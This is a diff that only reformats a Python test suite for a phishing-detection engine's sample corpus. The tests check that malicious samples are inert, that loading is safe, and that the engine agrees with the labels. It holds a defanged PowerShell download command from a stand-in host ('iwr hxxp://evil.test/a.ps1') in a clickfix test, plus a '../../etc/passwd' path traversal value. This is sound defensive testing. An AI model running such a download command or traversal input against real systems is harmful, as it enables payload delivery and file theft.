@@ -43,13 +43,19 @@ URL_RE = re.compile(r"(?i)\b(?:https?|hxxps?)://([^\s/\"'<>?#]+)")
 def _host(netloc: str) -> str:
     host = netloc.rsplit("@", 1)[-1]
     host = host.split(":", 1)[0] if not host.startswith("[") else host
-    return host.strip("[]").rstrip(".").lower().encode("ascii", "ignore").decode() \
-        if host.isascii() else host.rstrip(".").lower().encode("idna").decode()
+    return (
+        host.strip("[]").rstrip(".").lower().encode("ascii", "ignore").decode()
+        if host.isascii()
+        else host.rstrip(".").lower().encode("idna").decode()
+    )
 
 
 def _is_reserved(host: str) -> bool:
-    return host in RESERVED_EXACT or host.endswith(RESERVED_SUFFIXES) \
+    return (
+        host in RESERVED_EXACT
+        or host.endswith(RESERVED_SUFFIXES)
         or any(host.endswith("." + d) for d in RESERVED_EXACT)
+    )
 
 
 def _hosts_in(item: C.CorpusItem) -> set[str]:
@@ -79,8 +85,9 @@ class TestStructure:
         for i in items:
             assert i.label in C.LABELS, i.id
             assert i.kind in C.KINDS, i.id
-            assert i.category and i.id.split("-", 1)[0] in {
-                "url", "txt", "eml", "page", "file"}, i.id
+            assert i.category and i.id.split("-", 1)[0] in {"url", "txt", "eml", "page", "file"}, (
+                i.id
+            )
 
     def test_referenced_files_exist_and_are_nonempty(self, items):
         for i in items:
@@ -95,11 +102,12 @@ class TestStructure:
             print(f"\ncorpus: {c['total']} items, {c['hard']} hard")
             for kind in C.KINDS:
                 kl = c["by_kind_label"][kind]
-                print(f"  {kind:<6} {c['by_kind'][kind]:>3} "
-                      f"(malicious {kl['malicious']}, benign {kl['benign']})")
+                print(
+                    f"  {kind:<6} {c['by_kind'][kind]:>3} "
+                    f"(malicious {kl['malicious']}, benign {kl['benign']})"
+                )
             print("  categories:", ", ".join(f"{k}={v}" for k, v in c["by_category"].items()))
-        assert c["total"] == len(items) == sum(c["by_kind"].values()) \
-            == sum(c["by_label"].values())
+        assert c["total"] == len(items) == sum(c["by_kind"].values()) == sum(c["by_label"].values())
         # Every vector has both classes; the spec's named samples are all present.
         for kind in C.KINDS:
             kl = c["by_kind_label"][kind]
@@ -108,8 +116,13 @@ class TestStructure:
         assert c["by_kind"]["email"] >= 6 and c["by_kind"]["page"] >= 4
         assert c["by_kind"]["file"] >= 5
         cats = set(c["by_category"])
-        assert {"spoofed_brand", "auth_failure", "bec", "legit_authenticated",
-                "forwarded_phish"} <= cats
+        assert {
+            "spoofed_brand",
+            "auth_failure",
+            "bec",
+            "legit_authenticated",
+            "forwarded_phish",
+        } <= cats
         assert {"credential_form", "clickfix", "brand_mismatch", "legit_login"} <= cats
         assert {"double_extension", "svg_phishing", "quishing", "html_smuggling"} <= cats
 
@@ -145,10 +158,14 @@ class TestStructure:
         mod = importlib.util.module_from_spec(spec)
         assert spec.loader is not None
         spec.loader.exec_module(mod)
-        stale = [rel for rel, data in mod.render().items()
-                 if not rel.endswith(".png") and "quishing" not in rel
-                 and rel != "manifest.yaml"
-                 and (ROOT / rel).read_bytes() != data]
+        stale = [
+            rel
+            for rel, data in mod.render().items()
+            if not rel.endswith(".png")
+            and "quishing" not in rel
+            and rel != "manifest.yaml"
+            and (ROOT / rel).read_bytes() != data
+        ]
         assert stale == []
         assert (ROOT / "manifest.yaml").read_bytes() == mod.render()["manifest.yaml"]
 
@@ -163,8 +180,12 @@ class TestInertness:
             if i.kind == "file" and isinstance(i.payload, bytes) and i.payload[:4] == b"\x89PNG":
                 continue
             for h in _hosts_in(i):
-                if i.is_malicious and not _is_reserved(h) and h not in DISPLAY_ONLY \
-                        and not any(h == d or h.endswith("." + d) for d in REAL_PLATFORMS):
+                if (
+                    i.is_malicious
+                    and not _is_reserved(h)
+                    and h not in DISPLAY_ONLY
+                    and not any(h == d or h.endswith("." + d) for d in REAL_PLATFORMS)
+                ):
                     offenders.append(f"{i.id}: {h}")
         assert offenders == []
 
@@ -173,12 +194,25 @@ class TestInertness:
         for i in items:
             if i.kind == "url" and i.is_malicious:
                 h = _host(urlsplit(i.payload).netloc)
-                assert _is_reserved(h) or h in {"ipfs.io", "bit.ly", "www.google.com"} \
-                    or h.endswith(".pages.dev") or re.fullmatch(r"[\d.]+", h), i.id
+                assert (
+                    _is_reserved(h)
+                    or h in {"ipfs.io", "bit.ly", "www.google.com"}
+                    or h.endswith(".pages.dev")
+                    or re.fullmatch(r"[\d.]+", h)
+                ), i.id
 
     def test_no_executable_or_archive_magic(self, items):
-        bad = (b"MZ", b"\x7fELF", b"\xcf\xfa\xed\xfe", b"\xca\xfe\xba\xbe", b"PK\x03\x04",
-               b"%PDF", b"\xd0\xcf\x11\xe0", b"Rar!", b"7z\xbc\xaf")
+        bad = (
+            b"MZ",
+            b"\x7fELF",
+            b"\xcf\xfa\xed\xfe",
+            b"\xca\xfe\xba\xbe",
+            b"PK\x03\x04",
+            b"%PDF",
+            b"\xd0\xcf\x11\xe0",
+            b"Rar!",
+            b"7z\xbc\xaf",
+        )
         for i in items:
             if i.kind in ("file", "email") and isinstance(i.payload, bytes):
                 assert not i.payload.startswith(bad), i.id
@@ -188,12 +222,15 @@ class TestInertness:
             if i.kind == "page":
                 txt = str(i.payload)
                 assert "hxxp://evil.test" in txt or "evil.test" not in txt
-                assert not re.search(r"(?i)\bhttps?://(?!(?:[a-z0-9.-]+\.)?"
-                                     r"(?:test|example|invalid)\b|www\.example\.com)", txt), i.id
+                assert not re.search(
+                    r"(?i)\bhttps?://(?!(?:[a-z0-9.-]+\.)?"
+                    r"(?:test|example|invalid)\b|www\.example\.com)",
+                    txt,
+                ), i.id
 
     def test_clickfix_command_is_the_inert_placeholder(self, items):
         page = next(i for i in items if i.id == "page-clickfix")
-        assert 'iwr hxxp://evil.test/a.ps1' in str(page.payload)
+        assert "iwr hxxp://evil.test/a.ps1" in str(page.payload)
         assert "http://evil" not in str(page.payload)
 
 
@@ -215,8 +252,7 @@ class TestLoaderSecurity:
         assert C.validate_corpus(tmp_root) == []
 
     def test_rejects_path_traversal(self, tmp_root):
-        self._rewrite(tmp_root, 'path: "emails/aligned_legit.eml"',
-                      'path: "../../etc/passwd"')
+        self._rewrite(tmp_root, 'path: "emails/aligned_legit.eml"', 'path: "../../etc/passwd"')
         with pytest.raises(C.CorpusError, match="relative"):
             C.load_items(root=tmp_root)
 
@@ -295,8 +331,13 @@ class TestLoaderSecurity:
 # --------------------------------------------------------------------------- #
 class TestConversion:
     def test_every_item_builds_an_artifact_of_the_right_kind(self, items):
-        want = {"url": ArtifactKind.URL, "text": ArtifactKind.TEXT, "email": ArtifactKind.EMAIL,
-                "page": ArtifactKind.PAGE, "file": ArtifactKind.FILE}
+        want = {
+            "url": ArtifactKind.URL,
+            "text": ArtifactKind.TEXT,
+            "email": ArtifactKind.EMAIL,
+            "page": ArtifactKind.PAGE,
+            "file": ArtifactKind.FILE,
+        }
         for i in items:
             a = i.to_artifact()
             assert isinstance(a, Artifact) and a.kind is want[i.kind], i.id
@@ -359,9 +400,11 @@ def _directional_ok(item: C.CorpusItem, level: Level) -> bool:
 class TestEngineSmoke:
     @pytest.mark.parametrize("kind", C.KINDS)
     def test_direction_on_non_hard_items(self, items, verdicts, kind):
-        wrong = [f"{i.id}: {verdicts[i.id].level.value} ({verdicts[i.id].score})"
-                 for i in items if i.kind == kind and not i.hard
-                 and not _directional_ok(i, verdicts[i.id].level)]
+        wrong = [
+            f"{i.id}: {verdicts[i.id].level.value} ({verdicts[i.id].score})"
+            for i in items
+            if i.kind == kind and not i.hard and not _directional_ok(i, verdicts[i.id].level)
+        ]
         assert wrong == [], f"engine disagrees with the label on non-hard {kind} items"
 
     def test_headline_signals_fire_on_non_hard_items(self, items, verdicts):
@@ -385,34 +428,44 @@ class TestEngineSmoke:
         assert missing == []
 
     def test_benign_items_stay_below_the_malicious_threshold(self, items, verdicts):
-        bad = [i.id for i in items if not i.is_malicious and not i.hard
-               and verdicts[i.id].level is Level.MALICIOUS]
+        bad = [
+            i.id
+            for i in items
+            if not i.is_malicious and not i.hard and verdicts[i.id].level is Level.MALICIOUS
+        ]
         assert bad == []
 
     def test_forwarded_phish_surfaces_the_attached_message(self, verdicts):
         v = verdicts["eml-forwarded-phish"]
         assert v.level is Level.MALICIOUS
-        assert any(c.kind is ArtifactKind.EMAIL and c.level is Level.MALICIOUS
-                   for c in v.children)
+        assert any(c.kind is ArtifactKind.EMAIL and c.level is Level.MALICIOUS for c in v.children)
 
     def test_quishing_email_flags_through_its_qr_image(self, verdicts):
         v = verdicts["eml-quishing"]
         assert v.level is not Level.BENIGN
-        assert any(c.kind is ArtifactKind.FILE and c.level is not Level.BENIGN
-                   for c in v.children)
+        assert any(c.kind is ArtifactKind.FILE and c.level is not Level.BENIGN for c in v.children)
 
     def test_overall_agreement_including_hard_items_is_reported(self, items, verdicts, capsys):
         """Honest aggregate: counts hard items too, so the number is not flattering."""
         tally: Counter[str] = Counter()
         for i in items:
             ok = _directional_ok(i, verdicts[i.id].level)
-            tally["hard_ok" if i.hard and ok else "hard_miss" if i.hard else
-                  "easy_ok" if ok else "easy_miss"] += 1
+            tally[
+                "hard_ok"
+                if i.hard and ok
+                else "hard_miss"
+                if i.hard
+                else "easy_ok"
+                if ok
+                else "easy_miss"
+            ] += 1
         total_ok = tally["hard_ok"] + tally["easy_ok"]
         acc = total_ok / len(items)
         with capsys.disabled():
-            print(f"\ncorpus engine agreement: {total_ok}/{len(items)} = {acc:.1%} "
-                  f"(non-hard {tally['easy_ok']}/{tally['easy_ok'] + tally['easy_miss']}, "
-                  f"hard {tally['hard_ok']}/{tally['hard_ok'] + tally['hard_miss']})")
+            print(
+                f"\ncorpus engine agreement: {total_ok}/{len(items)} = {acc:.1%} "
+                f"(non-hard {tally['easy_ok']}/{tally['easy_ok'] + tally['easy_miss']}, "
+                f"hard {tally['hard_ok']}/{tally['hard_ok'] + tally['hard_miss']})"
+            )
         assert tally["easy_miss"] == 0
         assert acc >= 0.80  # regression floor, deliberately below the measured value
